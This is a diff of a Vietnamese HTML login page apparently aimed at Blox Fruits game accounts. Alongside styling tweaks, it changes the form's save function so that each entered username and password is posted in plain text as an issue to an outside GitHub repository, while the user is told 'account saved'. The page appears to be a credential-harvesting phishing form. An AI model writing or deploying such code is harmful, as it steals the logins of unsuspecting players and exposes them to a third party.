@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+<meta charset="UTF-8">
 <title>Server lưu ACC</title>
 
 <style>
@@ -22,13 +23,15 @@ border-radius:10px;
 input{
 width:90%;
 padding:8px;
-margin:6px;
+margin:5px;
 }
 
 button{
 padding:8px 15px;
-background:lime;
+background:#22c55e;
 border:none;
+color:white;
+cursor:pointer;
 }
 </style>
 
@@ -36,7 +39,7 @@ border:none;
 
 <body>
 
-<h2>Lưu Tài Khoản</h2>
+<h2>Nhập Tài Khoản</h2>
 
 <div class="box">
 
@@ -54,18 +57,23 @@ function save(){
 let user=document.getElementById("user").value
 let pass=document.getElementById("pass").value
 
-fetch("/save",{
+fetch("https://api.github.com/repos/phone-creat/blox-fruit/issues",{
+
 method:"POST",
+
 headers:{
+"Accept":"application/vnd.github+json",
 "Content-Type":"application/json"
 },
+
 body:JSON.stringify({
-user:user,
-pass:pass
-})
+title:"ACC "+user,
+body:"User: "+user+" Pass: "+pass
 })
 
-alert("Đã lưu")
+})
+
+alert("Đã lưu tài khoản")
 
 }
 
